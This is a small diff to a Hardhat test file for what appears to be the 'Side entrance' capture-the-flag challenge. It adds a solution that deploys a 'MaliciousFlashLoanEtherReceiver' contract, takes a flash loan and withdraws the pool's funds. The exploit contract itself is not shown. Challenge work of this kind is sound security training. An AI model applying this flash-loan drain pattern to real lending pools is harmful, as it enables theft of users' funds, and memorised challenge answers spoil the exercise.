@@ -1,3 +1,5 @@
+//@ts-check
+/// <reference path="../../node_modules/@nomiclabs/hardhat-ethers/src/internal/type-extensions.ts" />
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
@@ -25,6 +27,11 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const Receiver = await ethers.getContractFactory('MaliciousFlashLoanEtherReceiver', attacker);
+        const receiver = await Receiver.deploy(this.pool.address, attacker.address);
+
+        await receiver.connect(attacker).flashLoan();
+        await receiver.connect(attacker).withdraw();
     });
 
     after(async function () {
